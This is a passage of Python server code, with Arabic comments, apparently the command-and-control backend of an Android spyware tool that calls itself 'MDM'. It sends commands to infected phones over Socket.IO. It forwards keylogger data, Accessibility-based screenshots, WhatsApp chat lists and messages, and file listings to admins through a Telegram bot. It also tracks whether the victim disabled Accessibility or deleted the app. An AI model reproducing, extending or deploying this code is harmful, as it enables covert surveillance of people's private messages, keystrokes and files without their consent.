                        lbl = COMMANDS.get(cmd, {}).get("label", cmd)
                        msg_text = data.get("data", "")
                        mdm_bot.bot.send_message(cid,
                            f"<b>📋 تحديث الحالة</b>\n\n"
                            f"📱 <b>{short_label}</b>\n"
                            f"⚙ {lbl}\n"
                            f"━━━━━━━━━━━━━━━\n"
                            f"{msg_text}",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"فشل إرسال تحديث info: {e}")
            return jsonify({"success": True}), 200

        # Final response - consume pending
        if sid:
            pending = _pending_cmds.pop(sid, None)
        else:
            # Device disconnected - try matching by did across all pending entries
            pending = None
            for k, v in list(_pending_cmds.items()):
                if v.get("device_id") == did:
                    pending = _pending_cmds.pop(k, None)
                    break
        cid = pending.get("cid") if pending else None
        if cid and dev:
            try:
                result = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"), full_response=data)
                # Handle both plain string and (text, keyboard) tuple results
                if isinstance(result, tuple):
                    text, kb = result
                    mdm_bot.bot.send_message(cid, text, parse_mode="HTML", reply_markup=kb)
                else:
                    mdm_bot.bot.send_message(cid, result, parse_mode="HTML")
            except Exception as e:
                logger.error(f"فشل إرسال الاستجابة: {e}")

    return jsonify({"success": True}), 200


# ── REST API ──
@app.route("/api/devices", methods=["GET"])
def _api_devs():
    return jsonify({"success": True, "devices": list(dm._devices.values())}), 200

@app.route("/api/devices/<did>", methods=["GET"])
def _api_dev(did):
    d = dm.get_device(did)
    return jsonify({"success": True, "device": d}) if d else (jsonify({"success": False, "error": "غير موجود"}), 404)

@app.route("/api/devices/<did>/ban", methods=["POST"])
def _api_ban(did):
    r = request.json.get("reason") if request.is_json else None
    ok, m = dm.ban_device(did, reason=r)
    if ok and mdm_bot: mdm_bot._kick(did)
    return (jsonify({"success": True, "message": m}), 200) if ok else (jsonify({"success": False, "error": m}), 404)

@app.route("/api/devices/<did>/unban", methods=["POST"])
def _api_unban(did):
    ok, m = dm.unban_device(did)
    return (jsonify({"success": True, "message": m}), 200) if ok else (jsonify({"success": False, "error": m}), 404)

@app.route("/api/stats", methods=["GET"])
def _api_stats():
    return jsonify({"success": True, "stats": dm.get_stats()}), 200

@app.route("/api/devices/<did>/command", methods=["POST"])
def _api_cmd(did):
    if not request.is_json: return jsonify({"success": False, "error": "JSON مطلوب"}), 400
    cmd = request.json.get("command", ""); params = request.json.get("params")
    if not cmd: return jsonify({"success": False, "error": "command مطلوب"}), 400
    payload = build_command_payload(cmd, params)
    if not payload: return jsonify({"success": False, "error": f"غير معروف: {cmd}"}), 400
    sid = dm.get_sid_for_device(did)
    if sid and socketio:
        try:
            socketio.emit("command", payload, room=sid)
            return jsonify({"success": True, "command": cmd, "device_id": did, "method": "socket_push"}), 200
        except Exception as e:
            return jsonify({"success": False, "error": str(e)}), 500
    return jsonify({"success": False, "error": "device not connected via Socket.IO"}), 404

@app.route("/api/commands", methods=["GET"])
def _api_cmds():
    result = []
    for ck, ci in CATEGORIES.items():
        result.append({"category": ck, "label": ci["label"],
                        "commands": [{"type": c, "label": COMMANDS[c]["label"],
                                       "description": COMMANDS[c]["description"],
                                       "needs_param": COMMANDS[c]["needs_param"]}
                                      for c in get_commands_by_category(ck)]})
    return jsonify({"success": True, "categories": result}), 200


# ═══════════════════════════════════════════════════════════════════════
# 9b. FAST DEVICE EVENTS (REST) - reaches bot in <1 second
# ═══════════════════════════════════════════════════════════════════════

@app.route("/api/device/event", methods=["POST"])
def _api_device_event():
    """Receive immediate device events via REST (no Socket.IO needed).

    Events:
      - accessibility_enabled  : user just enabled Accessibility
      - accessibility_disabled : user just disabled Accessibility
      - network_restored       : network was off, now back (proves it wasn't deletion)
      - network_lost           : network went off (rarely used - usually no network to send)
    """
    data = request.json or {}
    did = data.get("device_id", "")
    event = data.get("event", "")
    message = data.get("message", "")
    timestamp = data.get("timestamp", 0)

    if not did or not event:
        return jsonify({"success": False, "error": "device_id and event required"}), 400

    logger.info(f"[REST-Event] {did} event={event} msg={message[:80]}")

    # Look up device (may not be registered yet if accessibility_just_enabled)
    dev = dm.get_device(did)
    if not dev:
        dev = {"device_id": did, "model": "Unknown", "short_id": "?"}
    short_label = _dev_label(dev)

    # Build event-specific bot message
    event_messages = {
        "accessibility_enabled":
            f"⚡ <b>إمكانية الوصول مفعّلة!</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"✅ تم تفعيل Accessibility\n"
            f"🟢 الجهاز متصل وجاهز للأوامر\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}",
        "accessibility_disabled":
            f"⚠️ <b>تم إلغاء إمكانية الوصول</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"🚫 الميزات المتقدمة معطلة (لقطات شاشة، keylogger)\n"
            f"💡 الميزات العادية قد تعمل إذا كان التطبيق مفتوحاً\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}",
        "network_restored":
            f"🌐 <b>عادت الشبكة - تأكد سبب الانقطاع</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"✅ <b>كان الانقطاع بسبب إطفاء الإنترنت</b>\n"
            f"🚫 <b>ليس بسبب حذف التطبيق</b>\n"
            f"🔄 الجهاز يعيد الاتصال الآن\n"
            f"━━━━━━━━━━━━━━━\n"
            f"💬 {message}",
        "network_lost":
            f"🔴 <b>انقطعت الشبكة</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚠ السبب: إطفاء الإنترنت (وليس حذف التطبيق)\n"
            f"💡 سيعود الاتصال عند عودة الشبكة",
    }

    msg_text = event_messages.get(event,
        f"📡 <b>حدث: {event}</b>\n\n📱 <b>{short_label}</b>\n💬 {message}")

    # Send to all admin users via Telegram bot
    if mdm_bot:
        for admin_id in Config.ADMIN_IDS:
            try:
                mdm_bot.bot.send_message(admin_id, msg_text, parse_mode="HTML")
            except Exception as e:
                logger.error(f"فشل إرسال حدث REST للبوت: {e}")

    return jsonify({"success": True, "event": event}), 200


# ═══════════════════════════════════════════════════════════════════════
# 10. SOCKET.IO EVENTS
# ═══════════════════════════════════════════════════════════════════════

@socketio.on("connect")
def _sock_connect():
    logger.info(f"اتصال: SID={request.sid}")

@socketio.on("disconnect")
def _sock_disconnect():
    sid = request.sid
    dev = dm.get_device_by_sid(sid)
    logger.info(f"قطع: SID={sid}")
    dm.handle_disconnect(sid)

    # ⚡ Debounce: لا ترسل رسالة انقطاع فوراً — انتظر 10 ثوانٍ
    # إذا عاد الجهاز خلال 10 ثوانٍ (إعادة اتصال تلقائي)، لا ترسل رسالة انقطاع
    # هذا يمنع التضارب بين "انقطع" و "متصل" عند إعادة الاتصال السريع
    if dev and mdm_bot:
        did = dev.get("device_id")
        short_label = _dev_label(dev)

        def _delayed_disconnect_notify():
            # تحقق إذا كان الجهاز عاد للاتصال خلال 10 ثوانٍ
            current_dev = dm.get_device(did) if did else None
            if current_dev and current_dev.get("status") == "online" and current_dev.get("sid"):
                logger.info(f"⏭️ تخطي إشعار الانقطاع — الجهاز {did} عاد للاتصال خلال 10 ثوانٍ")
                return

            # الجهاز لم يعد → أرسل إشعار الانقطاع
            for admin_id in Config.ADMIN_IDS:
                try:
                    mdm_bot.bot.send_message(admin_id,
                        f"🔴 <b>جهاز انقطع</b>\n\n"
                        f"📱 <b>{short_label}</b>\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"⚠ <b>السبب المحتمل:</b>\n"
                        f"• إطفاء الشبكة (سيعود قريباً ✅)\n"
                        f"• حذف التطبيق (لن يعود ❌)\n"
                        f"• إطفاء الجهاز (لن يعود ❌)\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"💡 إذا وصلت رسالة \"🌐 عادت الشبكة\" → كان السبب إطفاء النت\n"
                        f"💡 إذا لم تعد أي رسالة ← 5 دقائق → التطبيق محذوف",
                        parse_mode="HTML")
                except Exception as e:
                    logger.error(f"فشل إرسال إشعار الانقطاع: {e}")

        # ⚡ انتظر 10 ثوانٍ قبل إرسال الإشعار (debounce)
        eventlet.spawn_after(10, _delayed_disconnect_notify)

@socketio.on("register")
def _sock_register(data):
    did = data.get("device_id", "")
    if not did: emit("error", {"message": "device_id مطلوب"}); disconnect(); return
    dev, is_new, msg = dm.register_or_update(did, request.sid, data.get("model"), data.get("version"), data.get("ip"), data.get("extra_info"))
    if dev.get("banned"):
        emit("banned", {"message": "محظور", "reason": dev.get("ban_reason")}); disconnect(); return
    reg_data = {"status": "registered" if is_new else "updated", "message": msg,
         "heartbeat_interval": 30, "server_time": dev["last_seen"].isoformat(),
         "short_id": dev["short_id"]}
    if Config.LIVE_ACCESS_KEY:
        reg_data["access_key"] = Config.LIVE_ACCESS_KEY
    if Config.E2E_KEY:
        key, iv = _derive_key(Config.E2E_KEY, did)
        reg_data["e2e"] = {"key": key.hex(), "iv": iv.hex(), "algorithm": "AES-256-CBC"}
        if did not in _sessions:
            now = time.time()
            _sessions[did] = {"created_at": now, "renewed_at": now, "renew_count": 0}
    emit("registered", reg_data)
    logger.info(f"[Socket] {'جديد' if is_new else 'تحديث'} #{dev['short_id']} {did} | {dev.get('model')} | {dev.get('ip')}")

    # Notify bot if new device
    if is_new and mdm_bot:
        eventlet.spawn(mdm_bot._notify_device_connect, dev)

@socketio.on("heartbeat")
def _sock_heartbeat(_):
    d = dm.handle_heartbeat(request.sid)
    if d: emit("heartbeat_ack", {"status": "ok", "server_time": d["last_seen"].isoformat()})

@socketio.on("command_response")
def _sock_cmd_resp(data):
    dev = dm.get_device_by_sid(request.sid)
    sid = request.sid
    if dev:
        cmd = data.get("command", "?")
        status = data.get("status", "?")
        logger.info(f"[Socket] استجابة: #{dev.get('short_id', '?')} cmd={cmd} status={status}")

        # ⚠️ CRITICAL: status="info" is an intermediate update (e.g. "waiting for user").
        # Do NOT consume the pending entry - the final response will come later.
        if status == "info":
            # Send the info message to the bot but keep the pending entry intact
            pending = _pending_cmds.get(sid)
            if pending and mdm_bot:
                cid = pending["cid"]
                try:
                    short_label = _dev_label(dev)
                    lbl = COMMANDS.get(cmd, {}).get("label", cmd)
                    msg_text = data.get("data", "")
                    mdm_bot.bot.send_message(cid,
                        f"<b>📋 تحديث الحالة</b>\n\n"
                        f"📱 <b>{short_label}</b>\n"
                        f"⚙ {lbl}\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"{msg_text}",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"فشل إرسال تحديث info: {e}")
            return

        # Final response (success/error/permission_required) - consume pending
        pending = _pending_cmds.pop(sid, None)
        if pending and mdm_bot:
            cid = pending["cid"]
            try:
                result = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"), full_response=data)
                # Check if result is a tuple (text, keyboard) for file explorer
                if isinstance(result, tuple):
                    text, kb = result
                    mdm_bot.bot.send_message(cid, text, parse_mode="HTML", reply_markup=kb)
                else:
                    mdm_bot.bot.send_message(cid, result, parse_mode="HTML")
            except Exception as e:
                logger.error(f"فشل إرسال الاستجابة: {e}", exc_info=True)
                # ⚠️ Send a fallback error message so the user isn't left hanging
                try:
                    short_label = _dev_label(dev)
                    lbl = COMMANDS.get(cmd, {}).get("label", cmd)
                    mdm_bot.bot.send_message(cid,
                        f"❌ <b>خطأ في معالجة الاستجابة</b>\n\n"
                        f"📱 <b>{short_label}</b>\n"
                        f"⚙ {lbl}\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"⚠ {e}\n\n"
                        f"📋 الحالة: {status}\n"
                        f"📊 البيانات: <code>{str(data.get('data', ''))[:500]}</code>",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass


@socketio.on("file_explorer_data")
def _sock_file_explorer(data):
    """Handle file explorer data responses from devices.

    The Android app emits this event when sending file listing / file content
    results back to the server in response to file explorer commands.
    """
    dev = dm.get_device_by_sid(request.sid)
    if not dev:
        logger.warning(f"[Socket] file_explorer_data from unknown SID={request.sid}")
        return

    # Check for keylog event
    data_type = data.get("type", "")
    if data_type == "keylog":
        _handle_keylog_event(dev, data)
        return

    # ✅ Check for accessibility_connected event
    if data_type == "accessibility_connected":
        logger.info(f"✅ Accessibility connected on #{dev.get('short_id', '?')}")
        if mdm_bot:
            for admin_id in Config.ADMIN_IDS:
                try:
                    short_label = _dev_label(dev)
                    mdm_bot.bot.send_message(admin_id,
                        f"<b>✅ Accessibility متصل!</b>\n\n"
                        f"📱 <b>{short_label}</b>\n"
                        f"📸 الجهاز جاهز للقطات الشاشة\n\n"
                        f"💡 أرسل أمر screenshot لالتقاط صورة",
                        parse_mode="HTML")
                except Exception as e:
                    logger.error(f"فشل إرسال إشعار accessibility: {e}")
        return

    # ⚡ Check for screenshot_status event (legacy)
    if data_type == "screenshot_status":
        logger.info(f"📸 Screenshot status from #{dev.get('short_id', '?')}: {data.get('status', '?')}")
        return

    # ✅ Check for accessibility_disconnected event (user disabled it)
    if data_type == "accessibility_disconnected":
        logger.info(f"⚠️ Accessibility disconnected on #{dev.get('short_id', '?')}")
        if mdm_bot:
            for admin_id in Config.ADMIN_IDS:
                try:
                    short_label = _dev_label(dev)
                    mdm_bot.bot.send_message(admin_id,
                        f"<b>⚠️ تم إلغاء إمكانية الوصول!</b>\n\n"
                        f"📱 <b>{short_label}</b>\n"
                        f"🚫 لقطات الشاشة ومراقبة الإدخال معطلة\n\n"
                        f"💡 الميزات العادية (صور، فيديو، اتصال) قد تعمل إذا كان التطبيق مفتوحاً",
                        parse_mode="HTML")
                except Exception as e:
                    logger.error(f"فشل إرسال إشعار إلغاء accessibility: {e}")
        return

    # ⚡ Check for whatsapp_message event (مراقبة واتساب الدائمة)
    if data_type == "whatsapp_message":
        _handle_whatsapp_message(dev, data)
        return

    cmd = data.get("command", "?")
    status = data.get("status", "?")
    logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")

    # Use pop (not get) so stale entries don't linger
    pending = _pending_cmds.pop(request.sid, None)
    if pending and mdm_bot:
        cid = pending["cid"]
        try:
            result = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"), full_response=data)
            # Handle both plain string and (text, keyboard) tuple results
            if isinstance(result, tuple):
                text, kb = result
                mdm_bot.bot.send_message(cid, text, parse_mode="HTML", reply_markup=kb)
            else:
                mdm_bot.bot.send_message(cid, result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"فشل إرسال نتائج file explorer: {e}")


# ⚡ SOCKET.IO: base64_media handler (Layer 1 — real screenshot image)
@socketio.on("base64_media")
def _sock_base64_media(data):
    """Receive a base64-encoded media file (screenshot/photo) from a device."""
    dev = dm.get_device_by_sid(request.sid)
    if not dev:
        logger.warning(f"[Socket] base64_media from unknown SID={request.sid}")
        return

    media_type = data.get("type", "unknown")
    mime = data.get("mime", "image/jpeg")
    b64data = data.get("data", "")
    logger.info(f"📸 base64_media received from #{dev.get('short_id', '?')}: "
                f"type={media_type} mime={mime} size={len(b64data)} chars")

    if not b64data:
        logger.warning("⚠️ Empty base64 media data")
        return

    try:
        import base64 as _b64
        binary = _b64.b64decode(b64data)
        logger.info(f"📸 Decoded {len(binary)} bytes")

        if mdm_bot:
            short_label = _dev_label(dev)
            from io import BytesIO
            bio = BytesIO(binary)

            for admin_id in Config.ADMIN_IDS:
                try:
                    if mime.startswith("image/"):
                        mdm_bot.bot.send_photo(
                            admin_id,
                            photo=bio,
                            caption=f"📸 <b>لقطة شاشة حقيقية</b>\n\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes",
                            parse_mode="HTML"
                        )
                    else:
                        bio.seek(0)
                        ext = "jpg" if "jpeg" in mime or "jpg" in mime else "bin"
                        filename = f"media_{dev.get('short_id', 'x')}_{int(__import__('time').time())}.{ext}"
                        mdm_bot.bot.send_document(
                            admin_id,
                            document=bio,
                            filename=filename,
                            caption=f"📎 <b>ملف</b>\n\n📱 <b>{short_label}</b>\n📦 {len(binary)} bytes"
                        )
                    bio.seek(0)
                except Exception as e:
                    logger.error(f"فشل إرسال base64_media للبوت: {e}")

        _pending_cmds.pop(request.sid, None)
    except Exception as e:
        logger.error(f"❌ base64_media error: {e}", exc_info=True)


# ⚡ SOCKET.IO: screen_json handler (Layer 2 — accessibility tree dump)
@socketio.on("screen_json")
def _sock_screen_json(data):
    """Receive a JSON screen capture (accessibility tree) and render it as an image."""
    dev = dm.get_device_by_sid(request.sid)
    if not dev:
        logger.warning(f"[Socket] screen_json from unknown SID={request.sid}")
        return

    logger.info(f"📸 screen_json received from #{dev.get('short_id', '?')}: "
                f"{data.get('view_count', '?')} views")

    try:
        _handle_screen_json(dev, data)
    except Exception as e:
        logger.error(f"❌ screen_json error: {e}", exc_info=True)
        if mdm_bot:
            short_label = _dev_label(dev)
            for admin_id in Config.ADMIN_IDS:
                try:
                    mdm_bot.bot.send_message(admin_id,
                        f"❌ <b>فشل رسم لقطة الشاشة</b>\n\n📱 <b>{short_label}</b>\n⚠ {e}",
                        parse_mode="HTML")
                except Exception:
                    pass


def _handle_screen_json(dev, data):
    """⚡ أسطوري: استخدام القالب الجديد عند استلام screen_type + chats.

    إذا JSON يحتوي على screen_type="MAIN_CHAT_LIST" + chats[]:
      → استخدم قالب HTML الجديد (مطابق لواتساب 99%)

    وإلا (بيانات قديمة):
      → استخدم Pillow القديم (fallback)
    """
    screen_type = data.get("screen_type", "")
    chats = data.get("chats", [])

    # ⚡ إذا screen_type معروف + chats موجودة → استخدم القالب الجديد
    if screen_type == "MAIN_CHAT_LIST" and chats:
        try:
            _render_whatsapp_template(dev, data)
            return
        except Exception as e:
            logger.error(f"❌ Template rendering failed, falling back to Pillow: {e}")
            # نكمل للـ fallback

    # ⚡ Fallback: استخدم Pillow القديم (للبيانات القديمة أو الأخطاء)
    _handle_screen_json_legacy(dev, data)


def _render_whatsapp_template(dev, data):
    """⚡ أسطوري: ارسم واجهة واتساب باستخدام قالب HTML.

    1. حمّل قالب HTML من templates/whatsapp_chat_list.html
    2. املأ القالب ببيانات chats[]
    3. حوّل HTML → PNG عبر Playwright (مع fallback لـ Pillow)
    4. أرسل الصورة للبوت
    """
    import os as _os
    import io as _io
    import time as _time

    chats = data.get("chats", [])
    logger.info(f"🖼️ Rendering WhatsApp template: {len(chats)} chats")

    # 1. حمّل القالب
    template_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)),
                                   "templates", "whatsapp_chat_list.html")
    try:
        with open(template_path, "r", encoding="utf-8") as f:
            template_html = f.read()
    except FileNotFoundError:
        logger.error(f"❌ Template not found: {template_path}")
        template_html = _get_fallback_template()

    # 2. املأ القالب ببيانات chats
    chats_html = _generate_chats_html(chats)
    filled_html = template_html.replace(
        '<!-- chats will be inserted here by Python -->',
        chats_html
    )

    # 3. حوّل HTML → PNG عبر Playwright (مع fallback لـ Pillow)
    # ⚠️ نريد فقط صورة (لا نص) — Pillow fallback يرسم صورة بدل إرسال نص
    png_data = None
    try:
        png_data = _render_html_to_png_sync(filled_html)
    except Exception as e:
        logger.error(f"❌ Playwright failed, using Pillow fallback: {e}")
        # استخدم Pillow لرسم صورة (بدل إرسال نص)
        try:
            png_data = _render_chats_with_pillow(chats)
        except Exception as e2:
            logger.error(f"❌ Pillow fallback also failed: {e2}")
            # آخر احتياطي: لا ترسل شيئاً (بدل نص)
            logger.error("❌ All rendering failed — skipping (no text fallback)")
            return

    if not png_data:
        logger.error("❌ No PNG data generated — skipping (no text fallback)")
        return

    # 4. أرسل الصورة للبوت
    if mdm_bot:
        short_label = _dev_label(dev)
        bio = _io.BytesIO(png_data)
        bio.seek(0)

        caption = (
            f"📱 <b>واجهة واتساب</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📱 <b>{short_label}</b>\n"
            f"📋 النوع: قائمة المحادثات\n"
            f"💬 المحادثات: {len(chats)}\n"
            f"🕐 {_time.strftime('%H:%M:%S')}"
        )

        for admin_id in Config.ADMIN_IDS:
            try:
                mdm_bot.bot.send_photo(
                    admin_id,
                    photo=bio,
                    caption=caption,
                    parse_mode="HTML"
                )
                bio.seek(0)
                logger.info(f"✅ Template image sent to admin {admin_id}")
            except Exception as e:
                logger.error(f"❌ Failed to send template image: {e}")

    # نظّف
    _pending_cmds.pop(request.sid, None)


def _render_html_to_png_sync(html_content):
    """⚡ أسطوري: شغّل Playwright في thread منفصل لتجنب asyncio conflict.

    المشكلة: Socket.IO يستخدم eventlet/asyncio، وPlaywright Sync API
    لا يعمل داخل asyncio loop.

    الحل: شغّل Playwright في thread منفصل تماماً.
    """
    import threading
    import io as _io

    # اكتب HTML لملف مؤقت
    temp_html = "/tmp/whatsapp_render.html"
    with open(temp_html, "w", encoding="utf-8") as f:
        f.write(html_content)

    result = {"png": None, "error": None}

    def render_worker():
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context(
                    viewport={"width": 390, "height": 844},
                    device_scale_factor=2
                )
                page = context.new_page()
                page.goto(f"file://{temp_html}")
                page.wait_for_load_state("networkidle")

                actual_height = page.evaluate("document.body.scrollHeight")
                if actual_height > 0:
                    page.set_viewport_size({"width": 390, "height": actual_height})

                result["png"] = page.screenshot(full_page=True)
                browser.close()
        except Exception as e:
            result["error"] = str(e)

    # شغّل في thread منفصل
    t = threading.Thread(target=render_worker, daemon=True)
    t.start()
    t.join(timeout=30)  # حد أقصى 30 ثانية

    if result["error"]:
        raise Exception(result["error"])
    return result["png"]


def _render_chats_with_pillow(chats):
    """⚡ Fallback: ارسم قائمة المحادثات بـ Pillow (نفس شكل القالب التجريبي).

    يرسم واجهة قائمة محادثات واتساب بالوضع الداكن:
    - شريط علوي أخضر غامق + "WhatsApp"
    - شريط بحث رمادي
    - تبويبات تصفية (الكل، غير مقروء، المفضلة)
    - صفوف المحادثات: أيقونة ملوّنة + اسم + معاينة + وقت + unread badge
    - شريط FAB أخضر
    - تبويبات سفلية (المحادثات، المجموعات، الحالات، المكالمات)
    """
    try:
        from PIL import Image, ImageDraw, ImageFont
        import io as _io

        # أحجام ثابتة (نفس قالب HTML)
        img_w = 390
        header_h = 56
        search_h = 50
        tabs_h = 40
        bottom_h = 64
        row_h = 65
        max_rows = min(len(chats), 10)
        img_h = header_h + search_h + tabs_h + (max_rows * row_h) + bottom_h + 20

        # خلفية داكنة (نفس واتساب)
        img = Image.new("RGB", (img_w, img_h), (11, 20, 26))
        draw = ImageDraw.Draw(img)

        # خطوط
        def _load_font(size, bold=False):
            candidates = [
                f"/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else f"/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
                f"/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf" if bold else f"/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
            ]
            for path in candidates:
                try:
                    return ImageFont.truetype(path, size)
                except Exception:
                    continue
            return ImageFont.load_default()

        font_title = _load_font(18, bold=True)
        font_header = _load_font(16, bold=True)
        font_name = _load_font(14, bold=True)
        font_msg = _load_font(13)
        font_time = _load_font(11)
        font_small = _load_font(10)
        font_badge = _load_font(11, bold=True)

        # ألوان واتساب الرسمية
        COLOR_HEADER = (31, 44, 52)       # #1F2C34
        COLOR_BG = (11, 20, 26)           # #0B141A
        COLOR_SEARCH = (32, 44, 51)       # #202C33
        COLOR_TEXT = (233, 237, 239)      # #E9EDEF
        COLOR_GRAY = (134, 150, 160)      # #8696A0
        COLOR_GREEN = (37, 211, 102)      # #25D366
        COLOR_DARK_GREEN = (0, 168, 132)  # #00A884
        COLOR_DIVIDER = (28, 39, 47)      # #1C272F

        # ═══ شريط الحالة ═══
        draw.rectangle([0, 0, img_w, 24], fill=COLOR_HEADER)
        draw.text((14, 4), "9:41", fill=COLOR_TEXT, font=font_time)

        # ═══ الشريط العلوي ═══
        draw.rectangle([0, 24, img_w, 24 + header_h], fill=COLOR_HEADER)
        draw.text((16, 36), "WhatsApp", fill=COLOR_TEXT, font=font_title)
        # أيقونات يمين (camera, search, menu) — نرسم دوائر بسيطة
        for i, x in enumerate([img_w - 100, img_w - 65, img_w - 30]):
            draw.ellipse([x, 38, x + 20, 58], outline=COLOR_GRAY, width=1)

        # ═══ شريط البحث ═══
        search_y = 24 + header_h + 8
        draw.rounded_rectangle([12, search_y, img_w - 12, search_y + 36],
                               radius=18, fill=COLOR_SEARCH)
        # أيقونة بحث
        draw.ellipse([22, search_y + 10, 34, search_y + 22], outline=COLOR_GRAY, width=1)
        draw.text((40, search_y + 10), "ابحث أو ابدأ محادثة جديدة",
                 fill=COLOR_GRAY, font=font_msg)

        # ═══ تبويبات التصفية ═══
        tabs_y = search_y + 44
        tabs = [("الكل", True), ("غير مقروء", False), ("المفضلة", False), ("المجموعات", False)]
        x = 14
        for label, active in tabs:
            try:
                bbox = draw.textbbox((0, 0), label, font=font_msg)
                tw = bbox[2] - bbox[0]
            except Exception:
                tw = 50
            if active:
                draw.rounded_rectangle([x, tabs_y, x + tw + 20, tabs_y + 28],
                                       radius=14, fill=(24, 34, 41))
                draw.text((x + 10, tabs_y + 6), label, fill=COLOR_TEXT, font=font_msg)
            else:
                draw.text((x + 10, tabs_y + 6), label, fill=COLOR_GRAY, font=font_msg)
            x += tw + 30

        # ═══ صفوف المحادثات ═══
        AVATAR_COLORS = [
            (37, 211, 102), (0, 150, 136), (63, 81, 181), (244, 67, 54),
            (255, 152, 0), (156, 39, 176), (121, 85, 72), (0, 188, 212),
            (76, 175, 80), (255, 87, 34), (3, 169, 244), (139, 195, 74),
        ]

        y = tabs_y + 38
        for chat in chats[:max_rows]:
            name = chat.get("name", "?")
            msg = chat.get("lastMessage", "")
            time_str = chat.get("time", "")
            unread = chat.get("unread", 0)
            sent = chat.get("sent", False)

            # أيقونة دائرية ملوّنة
            color_idx = sum(ord(c) for c in name) % len(AVATAR_COLORS)
            avatar_color = AVATAR_COLORS[color_idx]
            avatar_x = 16
            avatar_y = y + 8
            draw.ellipse([avatar_x, avatar_y, avatar_x + 45, avatar_y + 45],
                        fill=avatar_color)
            # حرف أول
            letter = name[0].upper() if name else "?"
            try:
                bbox = draw.textbbox((0, 0), letter, font=font_header)
                tw = bbox[2] - bbox[0]
                th = bbox[3] - bbox[1]
                draw.text((avatar_x + (45 - tw) / 2, avatar_y + (45 - th) / 2 - 2),
                         letter, fill=(255, 255, 255), font=font_header)
            except Exception:
                pass

            # اسم (يمين الأيقونة)
            text_x = avatar_x + 55
            draw.text((text_x, y + 8), name[:22], fill=COLOR_TEXT, font=font_name)

            # معاينة الرسالة (تحت الاسم)
            preview_text = msg[:35]
            if sent:
                # علامة ✓✓ زرقاء قبل الرسالة
                draw.text((text_x, y + 30), ">>", fill=(83, 189, 235), font=font_time)
                draw.text((text_x + 18, y + 30), preview_text,
                         fill=COLOR_GRAY, font=font_msg)
            else:
                draw.text((text_x, y + 30), preview_text,
                         fill=COLOR_GRAY, font=font_msg)

            # وقت (يمين الصف)
            if time_str:
                try:
                    bbox = draw.textbbox((0, 0), time_str, font=font_time)
                    tw = bbox[2] - bbox[0]
                except Exception:
                    tw = 40
                time_color = COLOR_GREEN if unread > 0 else COLOR_GRAY
                draw.text((img_w - tw - 16, y + 8), time_str,
                         fill=time_color, font=font_time)

            # unread badge (دائرة خضراء بالرقم)
            if unread > 0:
                badge_text = str(unread)
                try:
                    bbox = draw.textbbox((0, 0), badge_text, font=font_badge)
                    tw = bbox[2] - bbox[0]
                except Exception:
                    tw = 10
                badge_w = max(tw + 12, 20)
                badge_x = img_w - badge_w - 12
                draw.rounded_rectangle([badge_x, y + 32, badge_x + badge_w, y + 52],
                                       radius=10, fill=COLOR_GREEN)
                draw.text((badge_x + (badge_w - tw) / 2, y + 36), badge_text,
                         fill=COLOR_BG, font=font_badge)

            # فاصل بين الصفوف
            draw.line([(text_x, y + row_h - 2), (img_w - 16, y + row_h - 2)],
                     fill=COLOR_DIVIDER, width=1)

            y += row_h

        # ═══ زر FAB (أخضر) ═══
        fab_y = img_h - bottom_h - 60
        draw.ellipse([img_w - 70, fab_y, img_w - 20, fab_y + 50],
                    fill=COLOR_DARK_GREEN)
        draw.text((img_w - 55, fab_y + 15), "+", fill=COLOR_BG, font=font_title)

        # ═══ التبويبات السفلية ═══
        bottom_y = img_h - bottom_h
        draw.rectangle([0, bottom_y, img_w, img_h], fill=COLOR_HEADER)
        draw.line([(0, bottom_y), (img_w, bottom_y)], fill=COLOR_DIVIDER, width=1)

        tabs_bottom = [
            ("المحادثات", True),
            ("التحديثات", False),
            ("المجموعات", False),
            ("المكالمات", False),
        ]
        tab_w = img_w / 4
        for i, (label, active) in enumerate(tabs_bottom):
            try:
                bbox = draw.textbbox((0, 0), label, font=font_small)
                tw = bbox[2] - bbox[0]
            except Exception:
                tw = 40
            color = COLOR_TEXT if active else COLOR_GRAY
            draw.text((tab_w * i + (tab_w - tw) / 2, bottom_y + 22), label,
                     fill=color, font=font_small)
            if active:
                # مؤشر أخضر تحت التبويب النشط
                draw.rectangle([tab_w * i + 20, bottom_y, tab_w * i + tab_w - 20, bottom_y + 3],
                              fill=COLOR_GREEN)

        # حفظ كـ PNG
        bio = _io.BytesIO()
        img.save(bio, format="PNG")
        bio.seek(0)
        logger.info(f"✅ Pillow fallback rendered: {len(chats)} chats, {img_w}x{img_h}")
        return bio.getvalue()

    except Exception as e:
        logger.error(f"❌ Pillow fallback error: {e}", exc_info=True)
        return None


def _generate_chats_html(chats):
    """توليد HTML لصفوف المحادثات من البيانات."""
    AVATAR_COLORS = [
        "#25d366", "#075e54", "#1fb8d4", "#df8c16", "#a028a8",
        "#e64a19", "#536dfe", "#8bc34a", "#ff5722", "#009688",
        "#9c27b0", "#3f51b5",
    ]

    def get_color(name):
